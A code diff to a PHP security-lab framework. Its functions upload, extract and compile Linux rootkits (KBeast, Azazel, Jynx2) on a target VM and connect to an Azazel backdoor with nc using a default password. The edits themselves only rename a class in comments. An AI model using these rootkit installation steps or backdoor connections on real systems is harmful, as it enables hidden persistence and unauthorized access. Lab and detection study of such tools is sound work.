@@ -360,7 +360,7 @@ In order to hide a certain connection, i replaced the default read function with
         // vm_revert2snapshot($ub1004, "rootkit_avgcoder_installed");pause();
         $this->cmd($this->target_ip, "history");
         $this->pause();
-        //$victime = new vm($this->target_vmx_name);
+        //$victime = new VM($this->target_vmx_name);
         $victime->vm2upload("$this->dir_c/preloadcheck.c", "$this->vm_tmp_lin/preloadcheck.c");
         $this->cmd($this->target_ip, "gcc $this->vm_tmp_lin/preloadcheck.c -o $this->vm_tmp_lin/preloadcheck -ldl ");
         $this->pause();
@@ -550,7 +550,7 @@ Hiding Users
     function rootkit4linux_kernel_kbeastv1() {
         $this->titre(__FUNCTION__);
         /*
-        //$vm = new vm($this->target_vmx_name);  if (!empty($this->snapshot)) $vm->vm2revert2snapshot($this->snapshot);
+        //$vm = new VM($this->target_vmx_name);  if (!empty($this->snapshot)) $vm->vm2revert2snapshot($this->snapshot);
         $this->rootkit4linux_kernel_kbeastv1_intro ();
         $this->rootkit4linux_kernel_kbeastv1_download ();
         $this->rootkit4linux_kernel_kbeastv1_install ();
@@ -595,7 +595,7 @@ directories and processes.
     
     function rootkit4linux_kernel_kbeastv1_install() {
         $this->ssTitre(__FUNCTION__);
-        //$victime = new vm($this->target_vmx_name);
+        //$victime = new VM($this->target_vmx_name);
         $victime->vm2upload("$this->dir_tools/Malware/rootkit4linux_kernel_kbeastv1.tar.gz", "$this->vm_tmp_lin/rootkit4linux_kernel_kbeastv1.tar.gz");
         $this->cmd($this->target_ip, "tar -xvzf $this->vm_tmp_lin/rootkit4linux_kernel_kbeastv1.tar.gz -C $this->vm_tmp_lin");
         $this->note("modify config.h to meet your requirement, remember that _MAGIC_NAME_ must be user with sh/bash shell");
@@ -616,7 +616,7 @@ directories and processes.
         $pid = "2856";
         $module_name = "ipsecs_kbeast_v1";
         
-        //$victime = new vm($this->target_vmx_name);
+        //$victime = new VM($this->target_vmx_name);
         $victime->vm2upload("$this->dir_c/preloadcheck.c", "$this->vm_tmp_lin/preloadcheck.c");
         $this->cmd($this->target_ip, "gcc $this->vm_tmp_lin/preloadcheck.c -o $this->vm_tmp_lin/preloadcheck -ldl ");
         $this->pause();
@@ -698,7 +698,7 @@ directories and processes.
         $chaine_more = "h4x";
         
         
-       // $victime = new vm($this->target_vmx_name);
+       // $victime = new VM($this->target_vmx_name);
         /*
          * rohff@ubuntu:~$ echo 'test h4ck3r d4t4' > /home/rohff/Desktop/_h4x_h4dedata.txt
          * echo 'test h4ck3r d4t4' > /home/rohff/Desktop/_h4x_h4dedata.txt
@@ -909,7 +909,7 @@ However, Rkhunter was not successful in discovering any hidden processes, hooked
     }
     function rootkit4linux_user_azazel_install() {
         $this->ssTitre(__FUNCTION__);
-        //$victime = new vm($this->target_vmx_name);
+        //$victime = new VM($this->target_vmx_name);
         $victime->vm2upload("$this->dir_tools/Malware/rootkit4linux_user_azazel.tar.gz", "$this->vm_tmp_lin/rootkit4linux_user_azazel.tar.gz");
         
         
@@ -929,13 +929,12 @@ However, Rkhunter was not successful in discovering any hidden processes, hooked
         $pid = 13328;
         $port = 61040;
         $module_name = "libselinux.so";
-        //$victime = new vm($this->target_vmx_name);
+        //$victime = new VM($this->target_vmx_name);
         $victime->vm2upload("$this->dir_c/preloadcheck.c", "$this->vm_tmp_lin/preloadcheck.c");
         $this->cmd($this->target_ip, "gcc $this->vm_tmp_lin/preloadcheck.c -o $this->vm_tmp_lin/preloadcheck -ldl ");
         $this->pause();
         
         $this->ssTitre("Make connection to Victim ");
-        // socat -,raw,echo=0 TCP:target:port,bind=:61040
         $this->cmd("localhost", "nc $this->target_ip 22 -p $port -v");
         $this->article("Backdoor password", "changeme");
         $this->note("you could choose port number between 61040-61050 for plaintext backdoor");
@@ -1125,7 +1124,7 @@ By default, this action does not log to syslog.");
     }
     function rootkit4linux_user_jynx2_execution() {
         $this->ssTitre(__FUNCTION__);
-        //$victime = new vm($this->target_vmx_name);
+        //$victime = new VM($this->target_vmx_name);
         $victime->vm2upload("$this->dir_c/preloadcheck.c", "$this->vm_tmp_lin/preloadcheck.c");
         $this->cmd($this->target_ip, "gcc $this->vm_tmp_lin/preloadcheck.c -o $this->vm_tmp_lin/preloadcheck -ldl ");
         $this->pause();
@@ -1244,7 +1243,7 @@ By default, this action does not log to syslog.");
     function rootkit4linux_user_jynx2_install() {
         $this->ssTitre(__FUNCTION__);
         
-        //$victime = new vm($this->target_vmx_name);
+        //$victime = new VM($this->target_vmx_name);
         $victime->vm2upload("$this->dir_c/preloadcheck.c", "$this->vm_tmp_lin/preloadcheck.c");
         $this->cmd($this->target_ip, "gcc $this->vm_tmp_lin/preloadcheck.c -o $this->vm_tmp_lin/preloadcheck -ldl ");
         $this->pause();
